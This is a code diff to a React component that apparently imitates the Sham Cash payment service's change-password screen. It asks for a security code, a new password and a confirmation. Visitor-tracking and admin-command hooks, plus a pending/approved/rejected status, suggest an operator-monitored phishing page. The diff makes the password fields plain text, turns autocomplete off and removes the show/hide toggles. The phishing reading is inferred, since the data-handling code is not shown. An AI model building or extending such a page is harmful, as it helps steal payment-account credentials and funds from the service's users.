@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";
+import { Lock, ShieldCheck, CheckCircle, XCircle } from "lucide-react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
@@ -64,8 +64,6 @@ function ShamLogo() {
 type Status = "idle" | "pending" | "approved" | "rejected";
 
 export function ShamCashChangePassword() {
-  const [showNew, setShowNew] = useState(false);
-  const [showConfirm, setShowConfirm] = useState(false);
   const [status, setStatus] = useState<Status>("idle");
   const [fields, setFields] = useState({ securityCode: "", newPass: "", confirmPass: "" });
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
@@ -198,33 +196,29 @@ export function ShamCashChangePassword() {
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
               <input
-                type={showNew ? "text" : "password"}
+                type="text"
                 placeholder={t.newPass}
                 disabled={status === "pending"}
                 value={fields.newPass}
                 onChange={(e) => setFields((p) => ({ ...p, newPass: e.target.value }))}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
+                autoComplete="off"
               />
-              <button type="button" onClick={() => setShowNew(!showNew)} className="text-white/60 hover:text-white/90 transition-colors">
-                {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-              </button>
             </div>
 
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
               <input
-                type={showConfirm ? "text" : "password"}
+                type="text"
                 placeholder={t.confirmPass}
                 disabled={status === "pending"}
                 value={fields.confirmPass}
                 onChange={(e) => setFields((p) => ({ ...p, confirmPass: e.target.value }))}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
+                autoComplete="off"
               />
-              <button type="button" onClick={() => setShowConfirm(!showConfirm)} className="text-white/60 hover:text-white/90 transition-colors">
-                {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-              </button>
             </div>
           </div>
 
